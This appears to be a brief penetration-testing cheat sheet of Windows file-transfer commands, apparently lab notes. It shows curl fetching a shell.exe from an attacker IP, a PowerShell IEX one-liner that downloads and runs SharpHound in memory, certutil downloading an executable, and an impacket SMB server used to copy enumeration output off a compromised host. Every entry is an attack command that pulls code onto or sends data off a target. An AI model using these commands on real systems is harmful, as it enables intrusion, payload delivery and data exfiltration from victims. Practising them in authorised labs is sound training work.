
# CURL
```shell
PS C:\xampp\htdocs> curl http://192.168.45.246/shell.exe -o shell.exe
```


# IEX
```shell
IEX(New-Object Net.WebClient).downloadString('http://10.10.16.7/SharpHound.ps1')
```


# CERTUTIL
```SHELL
certutil.exe -f -urlcache -split http://192.168.45.192/auditTracker.exe
```


# COPY
```shell
❯ sudo impacket-smbserver smbFolder $(pwd) -smb2support
PS C:\Windows\Temp\peas> copy output.txt \\192.168.45.189\smbFolder\output.txt
```


